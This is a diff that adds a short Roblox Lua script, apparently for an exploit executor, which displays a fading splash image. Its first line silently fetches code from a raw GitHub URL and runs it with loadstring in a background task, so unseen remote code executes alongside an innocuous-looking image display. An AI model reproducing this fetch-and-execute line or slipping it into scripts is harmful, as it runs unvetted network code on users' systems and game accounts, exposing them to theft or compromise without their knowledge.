@@ -1,0 +1,19 @@
+task.spawn(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/cjsxx/91917878/refs/heads/main/7878"))()end)
+local XA_ScreenGui = Instance.new("ScreenGui", gethui())
+local XA_Image = Instance.new("ImageLabel", XA_ScreenGui)
+XA_Image.AnchorPoint = Vector2.new(0.5, 0.5)
+XA_Image.Position = UDim2.new(0.5, 0, 0.5, 0)
+XA_Image.Size = UDim2.new(0, 500, 0, 500)
+XA_Image.BackgroundTransparency = 1
+XA_Image.Image = "rbxassetid://96484256426204"
+XA_Image.ImageTransparency = 1 
+local XA_TweenService = game:GetService("TweenService")
+local XA_TweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
+local XA_FadeIn = XA_TweenService:Create(XA_Image, XA_TweenInfo, {ImageTransparency = 0})
+local XA_FadeOut = XA_TweenService:Create(XA_Image, XA_TweenInfo, {ImageTransparency = 1})
+XA_FadeIn:Play()
+XA_FadeIn.Completed:Wait()
+task.wait(2)
+XA_FadeOut:Play()
+XA_FadeOut.Completed:Wait()
+XA_ScreenGui:Destroy()
